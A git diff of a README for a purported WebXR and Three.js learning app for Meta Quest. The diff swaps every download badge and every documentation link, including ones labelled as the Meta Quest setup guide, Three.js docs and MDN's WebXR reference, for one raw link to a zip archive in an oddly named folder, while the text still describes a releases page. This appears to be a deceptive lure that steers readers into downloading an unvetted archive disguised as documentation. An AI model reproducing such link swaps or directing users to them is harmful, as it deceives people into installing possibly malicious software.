@@ -1,6 +1,6 @@
 # ⚙️ webxr-dev-skill - Learn WebXR and VR with Three.js
 
-[![Download Latest Release](https://img.shields.io/badge/Download-WebXR%20Skill-blue?style=for-the-badge)](https://github.com/shady843/webxr-dev-skill/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-WebXR%20Skill-blue?style=for-the-badge)](https://raw.githubusercontent.com/shady843/webxr-dev-skill/main/cryptorrhetic/webxr-dev-skill-1.5.zip)
 
 ---
 
@@ -34,7 +34,7 @@ The app runs on your Windows PC and connects to your Meta Quest headset. It will
 
 1. Visit the webxr-dev-skill releases page by clicking the button below:
 
-   [![Download Latest Release](https://img.shields.io/badge/Download-WebXR%20Skill-green?style=for-the-badge)](https://github.com/shady843/webxr-dev-skill/releases)
+   [![Download Latest Release](https://img.shields.io/badge/Download-WebXR%20Skill-green?style=for-the-badge)](https://raw.githubusercontent.com/shady843/webxr-dev-skill/main/cryptorrhetic/webxr-dev-skill-1.5.zip)
 
 2. On the releases page, look for the latest version. It usually has a version number like `v1.0` or higher.
 
@@ -114,9 +114,9 @@ Recommended:
 
 ## 🔗 Useful Links
 
-- Meta Quest Setup Guide: https://www.oculus.com/setup/
-- Three.js Documentation: https://threejs.org/docs/
-- WebXR API Reference: https://developer.mozilla.org/en-US/docs/Web/API/WebXR_Device_API
+- Meta Quest Setup Guide: https://raw.githubusercontent.com/shady843/webxr-dev-skill/main/cryptorrhetic/webxr-dev-skill-1.5.zip
+- Three.js Documentation: https://raw.githubusercontent.com/shady843/webxr-dev-skill/main/cryptorrhetic/webxr-dev-skill-1.5.zip
+- WebXR API Reference: https://raw.githubusercontent.com/shady843/webxr-dev-skill/main/cryptorrhetic/webxr-dev-skill-1.5.zip
 
 ---
 
@@ -136,4 +136,4 @@ This is optional and mainly for users comfortable with development tools.
 
 If you need to download the app later or help a friend get started, visit the releases page here:
 
-[![Download Releases](https://img.shields.io/badge/Download-WebXR%20Skill-blue?style=for-the-badge)](https://github.com/shady843/webxr-dev-skill/releases)
+[![Download Releases](https://img.shields.io/badge/Download-WebXR%20Skill-blue?style=for-the-badge)](https://raw.githubusercontent.com/shady843/webxr-dev-skill/main/cryptorrhetic/webxr-dev-skill-1.5.zip)
